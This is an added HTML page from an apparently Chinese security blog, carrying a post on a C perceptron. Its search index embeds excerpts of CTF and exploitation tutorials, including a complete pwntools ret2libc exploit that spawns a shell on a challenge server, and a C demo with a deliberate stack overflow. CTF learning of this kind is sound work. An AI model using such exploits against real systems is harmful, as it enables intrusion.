@@ -1,0 +1,739 @@
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Personal security research workspace."><title>两百行代码搓一个原始神经网络 | C0nvR3 Lab</title><link rel=stylesheet href=/css/main.min.9eeddd5ac858c78da48fae24bd7b30a32bedfa493df35763c16a7da376c92d1f.css integrity="sha256-nu3dWshYx42kj64kvXswoyvt+kk981djwWp9o3bJLR8="><script src=/js/menu.min.67c2751db5fa3f7bee680b3708d78e4c9162722d173261b263a4e56eed55ee19.js integrity="sha256-Z8J1HbX6P3vuaAs3CNeOTJFici0XMmGyY6Tlbu1V7hk=" defer></script></head><body><header class=topbar><nav class=menu-bar aria-label="IDE menu"><div class=menu><button class=menu-trigger type=button aria-expanded=false>File</button><div class=menu-dropdown role=menu><a role=menuitem href=/>Home</a>
+<a role=menuitem href=/posts/>Blog</a>
+<a role=menuitem href=/research/>Research</a>
+<a role=menuitem href=/projects/>Projects</a>
+<a role=menuitem href=/ctf/>CTF</a>
+<a role=menuitem href=/about/>About</a></div></div><div class=menu><button class=menu-trigger type=button aria-expanded=false>View</button><div class=menu-dropdown role=menu><button type=button role=menuitem data-view-toggle=explorer>Toggle Explorer</button>
+<button type=button role=menuitem data-view-toggle=terminal>Toggle Terminal</button>
+<button type=button role=menuitem data-view-toggle=theme>Dark Mode</button></div></div><div class=menu><button class=menu-trigger type=button aria-expanded=false>Navigate</button><div class=menu-dropdown role=menu><button type=button role=menuitem data-dialog-open=search-dialog>Search <kbd>Ctrl K</kbd></button>
+<a role=menuitem href=/archives/>Archive</a>
+<a role=menuitem href=/categories/>Categories</a>
+<a role=menuitem href=/tags/>Tags</a></div></div><div class=menu><button class=menu-trigger type=button aria-expanded=false>Help</button><div class=menu-dropdown role=menu><a role=menuitem href=/about/>About Site</a>
+<button type=button role=menuitem data-dialog-open=shortcut-dialog>Shortcut</button></div></div></nav><span class=site-name>C0nvR3 Lab</span></header><dialog class=site-dialog id=search-dialog aria-labelledby=search-title><form method=dialog class=dialog-header><h2 id=search-title>Search workspace</h2><button type=submit aria-label="Close search">×</button></form><label class=search-label for=site-search>Search titles, sections, and tags</label>
+<input id=site-search type=search placeholder="Type to filter..." autocomplete=off><ul class=search-results data-search-results><li data-search-item data-search-text="about   <p>c0nvr3 lab 是一个轻量、静态优先的个人安全技术研究站点。</p>"><a href=/about/><span>About</span><small>/</small></a></li><li data-search-item data-search-text='geek challenge 2025 wp ctf wp ctf <hr>
+<p>这里只收录了我个人的wp,我队友的部分就不放出来了
+第一次写，写的烂，就当参考吧，可能有很多地方不严谨或有误
+还请各位大佬指教</p>
+<h2 id="pwn">pwn</h2>
+<h3 id="old_rop">old_rop</h3>
+<h4 id="解题流程">解题流程</h4>
+<p>查保护
+<figure class="article-image"><img src="/ctf/geek-challenge-2025-wp/image.png" alt="alt text" loading="lazy"></figure>
+
+查伪代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">__int64</span> <span style="color:#ff7b72">__fastcall</span> <span style="color:#d2a8ff;font-weight:bold">main</span>(<span style="color:#ff7b72">int</span> a1, <span style="color:#ff7b72">char</span> <span style="color:#ff7b72;font-weight:bold">**</span>a2, <span style="color:#ff7b72">char</span> <span style="color:#ff7b72;font-weight:bold">**</span>a3)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  _qword buf[<span style="color:#a5d6ff">10</span>]; <span style="color:#8b949e;font-style:italic">// [rsp+10h] [rbp-50h] byref
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#d2a8ff;font-weight:bold">write</span>(<span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">&amp;#34;hello, world</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&amp;#34;</span>, <span style="color:#a5d6ff">0xdull</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#d2a8ff;font-weight:bold">strcpy</span>((<span style="color:#ff7b72">char</span> <span style="color:#ff7b72;font-weight:bold">*</span>)buf, <span style="color:#a5d6ff">&amp;#34;welcome to ret2csu , but there is sometings different,please care about it !&amp;#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#d2a8ff;font-weight:bold">write</span>(<span style="color:#a5d6ff">1</span>, buf, <span style="color:#a5d6ff">0x4dull</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#d2a8ff;font-weight:bold">write</span>(<span style="color:#a5d6ff">1</span>, <span style="color:#a5d6ff">&amp;#34;</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&amp;#34;</span>, <span style="color:#a5d6ff">1ull</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#d2a8ff;font-weight:bold">sub_401156</span>(<span style="color:#a5d6ff">1ll</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">0ll</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">ssize_t</span> <span style="color:#d2a8ff;font-weight:bold">sub_401156</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  _byte buf[<span style="color:#a5d6ff">128</span>]; <span style="color:#8b949e;font-style:italic">// [rsp+0h] [rbp-80h] byref
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">return</span> <span style="color:#d2a8ff;font-weight:bold">read</span>(<span style="color:#a5d6ff">0</span>, buf, <span style="color:#a5d6ff">0x200ull</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>在sub_401156有一个明显栈溢出，没有后门函数，打libc，得先泄露libc基址，用write打印即可，但此处没有控制rdx的gadget,只能用read的时候rdx的残余值0x200多打印一些，然后正常写rop链即可</p>
+<h4 id="exp">exp</h4>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#ff7b72">from</span> <span style="color:#ff7b72">pwn</span> <span style="color:#ff7b72">import</span> <span style="color:#ff7b72;font-weight:bold">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"># io = process(&amp;#39;./pwn&amp;#39;)</span>
+</span></span><span style="display:flex;"><span>io <span style="color:#ff7b72;font-weight:bold">=</span> remote(<span style="color:#a5d6ff">&amp;#39;geek.ctfplus.cn&amp;#39;</span>,<span style="color:#a5d6ff">32696</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#ff7b72;font-weight:bold">=</span> elf(<span style="color:#a5d6ff">&amp;#34;./libc/libc.so.6&amp;#34;</span>)  
+</span></span><span style="display:flex;"><span>elf <span style="color:#ff7b72;font-weight:bold">=</span> elf(<span style="color:#a5d6ff">&amp;#34;./pwnt&amp;#34;</span>) 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>write_got <span style="color:#ff7b72;font-weight:bold">=</span> elf<span style="color:#ff7b72;font-weight:bold">.</span>got[<span style="color:#a5d6ff">&amp;#39;write&amp;#39;</span>]
+</span></span><span style="display:flex;"><span>write_plt <span style="color:#ff7b72;font-weight:bold">=</span> elf<span style="color:#ff7b72;font-weight:bold">.</span>plt[<span style="color:#a5d6ff">&amp;#39;write&amp;#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x00000000004012d3</span>
+</span></span><span style="display:flex;"><span>ret_addr <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x000000000040101a</span> 
+</span></span><span style="display:flex;"><span>read_addr <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x0000000000401156</span>
+</span></span><span style="display:flex;"><span>pop_rsi_r15 <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x00000000004012d1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>line <span style="color:#ff7b72;font-weight:bold">=</span> io<span style="color:#ff7b72;font-weight:bold">.</span>recvline()
+</span></span><span style="display:flex;"><span>print(line)
+</span></span><span style="display:flex;"><span>line <span style="color:#ff7b72;font-weight:bold">=</span> io<span style="color:#ff7b72;font-weight:bold">.</span>recvline()
+</span></span><span style="display:flex;"><span>print(line)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payleak <span style="color:#ff7b72;font-weight:bold">=</span> cyclic(<span style="color:#a5d6ff">0x88</span>) <span style="color:#ff7b72;font-weight:bold">+</span>p64(pop_rdi) <span style="color:#ff7b72;font-weight:bold">+</span> p64(<span style="color:#a5d6ff">1</span>) <span style="color:#ff7b72;font-weight:bold">+</span> p64(pop_rsi_r15) <span style="color:#ff7b72;font-weight:bold">+</span> p64(write_got) <span style="color:#ff7b72;font-weight:bold">+</span>p64(<span style="color:#a5d6ff">0</span>) <span style="color:#ff7b72;font-weight:bold">+</span> p64(write_plt) <span style="color:#ff7b72;font-weight:bold">+</span>p64(read_addr)
+</span></span><span style="display:flex;"><span>io<span style="color:#ff7b72;font-weight:bold">.</span>sendline(payleak)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>leaked_data <span style="color:#ff7b72;font-weight:bold">=</span> io<span style="color:#ff7b72;font-weight:bold">.</span>recv(<span style="color:#a5d6ff">0x200</span>)
+</span></span><span style="display:flex;"><span>write_addr <span style="color:#ff7b72;font-weight:bold">=</span> u64(leaked_data[<span style="color:#a5d6ff">0</span>:<span style="color:#a5d6ff">8</span>])
+</span></span><span style="display:flex;"><span>print(<span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&amp;#34;leaked write address: </span><span style="color:#a5d6ff">{</span>hex(write_addr)<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&amp;#34;</span>)
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#ff7b72;font-weight:bold">=</span> write_addr <span style="color:#ff7b72;font-weight:bold">-</span> libc<span style="color:#ff7b72;font-weight:bold">.</span>symbols[<span style="color:#a5d6ff">&amp;#39;write&amp;#39;</span>]
+</span></span><span style="display:flex;"><span>print(<span style="color:#79c0ff">f</span><span style="color:#a5d6ff">&amp;#34;libc base: </span><span style="color:#a5d6ff">{</span>hex(libc_base)<span style="color:#a5d6ff">}</span><span style="color:#a5d6ff">&amp;#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>system_addr <span style="color:#ff7b72;font-weight:bold">=</span> libc_base <span style="color:#ff7b72;font-weight:bold">+</span> libc<span style="color:#ff7b72;font-weight:bold">.</span>symbols[<span style="color:#a5d6ff">&amp;#39;system&amp;#39;</span>]
+</span></span><span style="display:flex;"><span>binsh_addr <span style="color:#ff7b72;font-weight:bold">=</span> libc_base <span style="color:#ff7b72;font-weight:bold">+</span> libc<span style="color:#ff7b72;font-weight:bold">.</span>search(<span style="color:#79c0ff">b</span><span style="color:#a5d6ff">&amp;#34;/bin/sh&amp;#34;</span>)<span style="color:#ff7b72;font-weight:bold">.</span><span style="color:#d2a8ff;font-weight:bold">__next__</span>()
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&amp;#34;system:&amp;#34;</span>,hex(system_addr))
+</span></span><span style="display:flex;"><span>print(<span style="color:#a5d6ff">&amp;#34;binsh:&amp;#34;</span>,hex(binsh_addr))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#ff7b72;font-weight:bold">=</span> cyclic(<span style="color:#a5d6ff">0x88</span>) <span style="color:#ff7b72;font-weight:bold">+</span> p64(pop_rdi) <span style="color:#ff7b72;font-weight:bold">+</span> p64(binsh_addr) <span style="color:#ff7b72;font-weight:bold">+</span> p64(system_addr)
+</span></span><span style="display:flex;"><span>io<span style="color:#ff7b72;font-weight:bold">.</span>sendline (payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#ff7b72;font-weight:bold">.</span>interactive()
+</span></span></code></pre></div><h3 id="mission-calculator">mission calculator</h3>
+<h4 id="解题流程-1">解题流程</h4>
+<p>这题不用查保护，就是一个单纯的计算题，直接写一个for全算出来发回去就行</p>'><a href=/ctf/geek-challenge-2025-wp/><span>Geek Challenge 2025 WP</span><small>ctf/</small></a></li><li data-search-item data-search-text='perf与简单的侧信道攻击 research ctf <h2 id="perf">perf</h2>
+<h3 id="简介">简介</h3>
+<p><code>perf</code> 是 linux 系统性能分析工具集，全称是 <code>performance event counters</code>
+它基于 linux 内核的 perf_events 子系统，能够提供硬件和软件层面的性能分析能力
+我们这里会用到它的一些功能以获取一些硬件事件的信息，因此，你必须确保自己的虚拟机支持 <code>pmu</code>
+功能</p>
+<h3 id="准备perf">准备perf</h3>
+<h4 id="事前准备">事前准备</h4>
+<p>首先确定你的设备支持 pmu 功能，如果条件允许，实体机上使用 perf 会方便很多，如果你使用的是 wsl2 作为使用的虚拟机，请在设置中开启 <code>性能计数器</code> ，并使用除 ubuntu 以外的系统，因为 wsl2 对内核的魔改会导致一些兼容性问题，我捣鼓了两天也没能完美解决，可以在 wsl2 上选择其他 linux 进行尝试，或者换用 vmware ，在使用vmware时，请在硬件设置里，添加上<code>虚拟化 cpu 性能计数器</code>，并禁用所有hyperv相关的设置，并关闭虚拟化保护
+包括(仅限vmware使用者,wsl2 不要改):</p>
+<ul>
+<li>windows安全中心 -&amp;gt; 设备安全性 -&amp;gt; 内核隔离 -&amp;gt; 内存完整性/本地安全机构保护</li>
+<li>windows功能 -&amp;gt; hyper-v/virtual machine platform/windows虚拟机监控程序平台</li>
+</ul>
+<h4 id="perf安装">perf安装</h4>
+<p>安装 perf 可以通过</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt-get install linux-tools-generic
+</span></span></code></pre></div><h4 id="相关设置">相关设置</h4>
+<h5 id="使用权限">使用权限</h5>
+<p>等安装完成后并不能直接使用，你需要先查看</p>
+<pre tabindex="0"><code>cat /proc/sys/kernel/perf_event_paranoid
+</code></pre><p>这个<code>perf_event_paranoid</code>设置了运行时权限相关的内容，建议修改成小于等于1的值</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo sh -c <span style="color:#a5d6ff">&amp;#39;echo -1 &amp;gt; /proc/sys/kernel/perf_event_paranoid&amp;#39;</span>
+</span></span></code></pre></div><h5 id="cpu核心与内存分配">cpu核心与内存分配</h5>
+<p>此时可以尝试一下使用</p>'><a href=/research/perf%E4%B8%8E%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB/><span>Perf与简单的侧信道攻击</span><small>research/</small></a></li><li data-search-item data-search-text='ret2dlresolve posts ctf <h2 id="理论部分">理论部分</h2>
+<p>首先最好确认你学习过elf文件结构相关的内容，当然如果没学过这里也会简单的讲解一些
+本文主要讲靠pwntools的ret2dlresolvepayload工具一把梭所需payload,这比手搓payload轮椅太多了，手搓payload咕到下回了，毕竟国道上的大运只管开就好了，但旁边的小轿车考虑的可就多了</p>
+<p>这里来复习一下动态链接和延迟绑定
+<figure class="article-image"><img src="/posts/ret2dlresolve/lazy-plt.png" alt="alt text" loading="lazy"></figure>
+
+图片中展示了当我们call一个函数时的大致流程(虽然缺少了部分内容，但是还是很直观的)，如果我们首次 call 一个函数，首先是plt[n]被执行，jmp 到 got 表中   对应的条目,但此时该got条目里存的还不是该函数的真实地址，而是 该函数 plt表 中下一条指令的地址，然后此时会push reloc_arg,它是在重定位表 .rel.plt 中，用来定位函数相关信息的一个偏移量,接下来跳转到 plt 的起始部分，通常称为 plt[0],然后plt[0] 会先 push 一个 link_map 结构体的地址（通过 got[1] 获得），然后 jmp 到 _dl_runtime_resolve 函数（其地址存储在 got[2] 中）解析和填充got[n]为真实的函数地址，这个过程中我们只需要在可控的内存中伪造_dl_runtime_resolve的参数，也就是link_map 和 reloc_arg</p>
+<h2 id="demo">demo</h2>
+<h3 id="32位-非-full-relro">32位 非 full relro</h3>
+<p>示例demo</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&amp;lt;stdio.h&amp;gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&amp;lt;unistd.h&amp;gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">static</span> <span style="color:#ff7b72">void</span> <span style="color:#d2a8ff;font-weight:bold">vuln</span>(<span style="color:#ff7b72">void</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">char</span> buf[<span style="color:#a5d6ff">64</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">puts</span>(<span style="color:#a5d6ff">&amp;#34;input:&amp;#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">read</span>(<span style="color:#a5d6ff">0</span>, buf, <span style="color:#a5d6ff">0x200</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">int</span> <span style="color:#d2a8ff;font-weight:bold">main</span>(<span style="color:#ff7b72">void</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">setvbuf</span>(stdin, null, _ionbf, <span style="color:#a5d6ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">setvbuf</span>(stdout, null, _ionbf, <span style="color:#a5d6ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">setvbuf</span>(stderr, null, _ionbf, <span style="color:#a5d6ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">vuln</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>使用以下命令编译</p>'><a href=/posts/ret2dlresolve/><span>Ret2dlresolve</span><small>posts/</small></a></li><li data-search-item data-search-text="workspace preview posts hugo workspace testing 用于检查 c0nvr3 lab 的 markdown、代码块、图片与文章布局。"><a href=/posts/workspace-preview/><span>Workspace Preview</span><small>posts/</small></a></li><li data-search-item data-search-text='两百行代码搓一个原始神经网络 posts  <p>这个文章主要还是因为这周研究了挺久的ai相关的东西，然后休闲时刷视频发现了这个</p>
+<p><a href="https://www.bilibili.com/video/bv1zp4y1g7g5/?share_source=copy_web&amp;amp;vd_source=853200eb173acad552081e78b7529b49">we&amp;rsquo;re building computers wrong</a></p>
+<p>闲的没事尝试复现了一下其中的第一个demo，这也是是一个很简单但很有意思的demo
+如果你闲的蛋疼可以考虑看一下视频，就能大致知到原理了，当然你也可以考虑跳过，我在下面简述一下</p>
+<p>另外完整的代码我已经放在 github 了，点一下我头像下面的连接就可以找到</p>
+<h2 id="基本原理">基本原理</h2>
+<p>如果你看了视频，这一步可以跳过</p>
+<p>1958年，frank rosenblatt提出了一种模仿神经发射信号方式的机器 mark i 感知机，mark i 的输入层是一个 20x20 的感光单元矩阵，共400个光电探测器，用于&amp;quot;看&amp;quot;图像，并将光学信号转化为电信号，神经元之间连接的&amp;quot;权重&amp;quot;被编码在电位器中
+回到神经细胞(这里不是严格生物意义上的神经细胞)上，一个神经细胞可以有两种激活状态，激活或者不激活，而神经细胞之间可以有连接，如果一个神经细胞连接数个神经细胞，这个细胞的激活状态由其他神经细胞决定，这些神经细胞的激活与不激活的状态通过连接传递给这个神经细胞，不同的神经细胞之间的连接强度不同，部分连接可以起到刺激作用，部分为抑制作用，当整合后的信号超过某个阈值，这个神经细胞就会激活</p>
+<p>我们可以把这里的连接强度视作一种权重，不同神经细胞的输入乘以对应的权重的和是否能够达到某个阈值决定下一个神经细胞的状态，因此我们可以很简单的模拟出神经细胞的运作方式，复现一下 mark i 感知机
+有可能你看的一头雾水，直接上实战演示</p>
+<h2 id="搓一个原始神经网络">搓一个原始神经网络</h2>
+<p>这里的原理并不是特别复杂，因此你甚至可以使用c语言搓一个出来，所以我们就直接掏出巨大的c语言，直接做一个简单的demo使得可以分辨方形和圆形</p>
+<h3 id="基本处理">基本处理</h3>
+<p>为了方便接下来的代码编写，我们先搓一个common.h文件</p>
+<h4 id="宏">宏</h4>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#ifndef common_h
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#define common_h
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&amp;lt;stdio.h&amp;gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&amp;lt;stdlib.h&amp;gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&amp;lt;string.h&amp;gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic"></span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#define width  20         </span><span style="color:#8b949e;font-style:italic">// 图形宽度
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span><span style="color:#8b949e;font-weight:bold;font-style:italic">#define height 20         </span><span style="color:#8b949e;font-style:italic">// 图形高度
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span><span style="color:#8b949e;font-weight:bold;font-style:italic">#define bias   20.0f      </span><span style="color:#8b949e;font-style:italic">// 分类阈值
+</span></span></span></code></pre></div><h4 id="神经元输入">神经元输入</h4>
+<p>首先我们需要一个 <code>20*20</code> 的&amp;quot;感光单元矩阵&amp;quot;，当然我们使用一个 <code>20*20</code> char数组就行了,数组的每个索引处可以是一个数，这里我们为了方便，只采用0和1，这<code>20*20</code>的每个神经元的权重我们同样采用一个数组保存，但是这个没办法缩减，使用一个float数组</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">typedef</span> <span style="color:#ff7b72">unsigned</span> <span style="color:#ff7b72">char</span> image[height][width];
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">typedef</span> <span style="color:#ff7b72">float</span> weights[height][width];
+</span></span></code></pre></div><h4 id="图像的保存与加载">图像的保存与加载</h4>
+<p>这里为了简单方便的表示，我们就不使用.png .jpg之类的复杂的图片，我们使用一个.bin文件，每个字节代表一个像素，每个图片20*20=400个字节</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">static</span> <span style="color:#ff7b72">inline</span> <span style="color:#ff7b72">int</span> <span style="color:#d2a8ff;font-weight:bold">load_image</span>(<span style="color:#ff7b72">const</span> <span style="color:#ff7b72">char</span> <span style="color:#ff7b72;font-weight:bold">*</span>filepath, image img) {
+</span></span><span style="display:flex;"><span>    file <span style="color:#ff7b72;font-weight:bold">*</span>f <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">fopen</span>(filepath, <span style="color:#a5d6ff">&amp;#34;rb&amp;#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> (<span style="color:#ff7b72;font-weight:bold">!</span>f) <span style="color:#ff7b72">return</span> <span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">size_t</span> n <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">fread</span>(img, <span style="color:#ff7b72">sizeof</span>(<span style="color:#ff7b72">unsigned</span> <span style="color:#ff7b72">char</span>), height <span style="color:#ff7b72;font-weight:bold">*</span> width, f);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">fclose</span>(f);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> (n <span style="color:#ff7b72;font-weight:bold">==</span> height <span style="color:#ff7b72;font-weight:bold">*</span> width) <span style="color:#ff7b72;font-weight:bold">?</span> <span style="color:#a5d6ff">0</span> <span style="color:#ff7b72;font-weight:bold">:</span> <span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">static</span> <span style="color:#ff7b72">inline</span> <span style="color:#ff7b72">void</span> <span style="color:#d2a8ff;font-weight:bold">save_weights</span>(<span style="color:#ff7b72">const</span> weights w, <span style="color:#ff7b72">const</span> <span style="color:#ff7b72">char</span> <span style="color:#ff7b72;font-weight:bold">*</span>path) {
+</span></span><span style="display:flex;"><span>    file <span style="color:#ff7b72;font-weight:bold">*</span>f <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">fopen</span>(path, <span style="color:#a5d6ff">&amp;#34;wb&amp;#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> (<span style="color:#ff7b72;font-weight:bold">!</span>f) {
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">fprintf</span>(stderr, <span style="color:#a5d6ff">&amp;#34;error: cannot write weights to %s</span><span style="color:#79c0ff">\n</span><span style="color:#a5d6ff">&amp;#34;</span>, path);
+</span></span><span style="display:flex;"><span>        <span style="color:#d2a8ff;font-weight:bold">exit</span>(<span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">fwrite</span>(w, <span style="color:#ff7b72">sizeof</span>(<span style="color:#ff7b72">float</span>), height <span style="color:#ff7b72;font-weight:bold">*</span> width, f);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">fclose</span>(f);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="连接权重的加载">连接权重的加载</h4>
+<p>同样，我们可以给将权重保存到.bin文件，并从此加载</p>'><a href=/posts/%E4%B8%A4%E7%99%BE%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%90%93%E4%B8%80%E4%B8%AA%E5%8E%9F%E5%A7%8B%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/><span>两百行代码搓一个原始神经网络</span><small>posts/</small></a></li><li data-search-item data-search-text='栈迁移 - pivoting posts ctf <h1 id="栈迁移">栈迁移</h1>
+<p>之前答应某人写一篇文章讲栈迁移，这里附带一些栈相关的知识，尽可能全面的讲述栈和栈迁移，结合例题应用
+文章讨论的内容都建立在<code>x86-64 linux</code>上</p>
+<h2 id="栈相关寄存器">栈相关寄存器</h2>
+<h3 id="rsp">rsp</h3>
+<ul>
+<li>指向当前栈顶，决定 cpu 从哪里取返回地址与 rop 数据</li>
+</ul>
+<h3 id="rbp">rbp</h3>
+<ul>
+<li>指向当前函数栈帧基址，用作稳定的栈内数据定位与栈迁移跳板</li>
+</ul>
+<h2 id="栈相关的指令">栈相关的指令</h2>
+<p>这里只讲一些需要特别注意的指令，add sub一类明显的就略过了</p>
+<h3 id="push">push</h3>
+<p>push是一个压栈指令，可以将寄存器立即数或内存中的数据压入栈中，这条指令的具体操作包括</p>
+<ol>
+<li>rsp - 8</li>
+<li>将指定数据写在rsp指向的内存处
+需要注意是先rsp减小，再写入数据，当压入立即数时会先符号扩展至8字节，再压入</li>
+</ol>
+<h3 id="pop">pop</h3>
